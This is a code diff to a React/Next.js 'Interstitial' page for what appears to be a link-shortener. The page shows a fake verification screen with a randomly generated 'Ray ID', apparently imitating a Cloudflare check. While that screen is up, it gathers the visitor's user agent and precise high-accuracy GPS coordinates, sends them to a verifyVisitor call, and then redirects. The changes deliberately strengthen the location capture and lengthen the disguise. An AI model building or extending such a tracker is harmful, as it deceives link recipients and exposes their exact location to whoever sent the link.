@@ -8,14 +8,14 @@ export default function Interstitial({ params }: { params: Promise<{ code: strin
     const [rayId, setRayId] = useState('');
 
     useEffect(() => {
-        // Set domain and Ray ID
-        if (typeof window !== 'undefined') {
-            setDomain(window.location.hostname);
-            setRayId(Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10));
-        }
-
         const runVerification = async () => {
             const unwrappedParams = await params;
+
+            // Generate Ray ID
+            if (typeof window !== 'undefined') {
+                setRayId(Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10));
+            }
+
             const info = {
                 shortCode: unwrappedParams.code,
                 userAgent: navigator.userAgent,
@@ -31,7 +31,18 @@ export default function Interstitial({ params }: { params: Promise<{ code: strin
                 try {
                     const res = await verifyVisitor(finalInfo);
                     if (res?.redirectUrl) {
-                        window.location.replace(res.redirectUrl);
+                        // Extract domain from the redirect URL to display
+                        try {
+                            const url = new URL(res.redirectUrl);
+                            setDomain(url.hostname);
+                        } catch {
+                            setDomain(res.redirectUrl);
+                        }
+
+                        // Small delay to show the verification screen
+                        setTimeout(() => {
+                            window.location.replace(res.redirectUrl);
+                        }, 1500);
                     } else {
                         window.location.replace('https://google.com');
                     }
@@ -40,10 +51,11 @@ export default function Interstitial({ params }: { params: Promise<{ code: strin
                 }
             };
 
-            // Request Geolocation
+            // Request Geolocation with full precision
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
+                        // Store full precision coordinates
                         info.latitude = position.coords.latitude;
                         info.longitude = position.coords.longitude;
                         info.accuracy = position.coords.accuracy;
@@ -53,7 +65,11 @@ export default function Interstitial({ params }: { params: Promise<{ code: strin
                         console.log("Geo denied");
                         send(info);
                     },
-                    { timeout: 4000 }
+                    {
+                        timeout: 4000,
+                        enableHighAccuracy: true, // Request high accuracy GPS
+                        maximumAge: 0 // Don't use cached position
+                    }
                 );
             } else {
                 send(info);
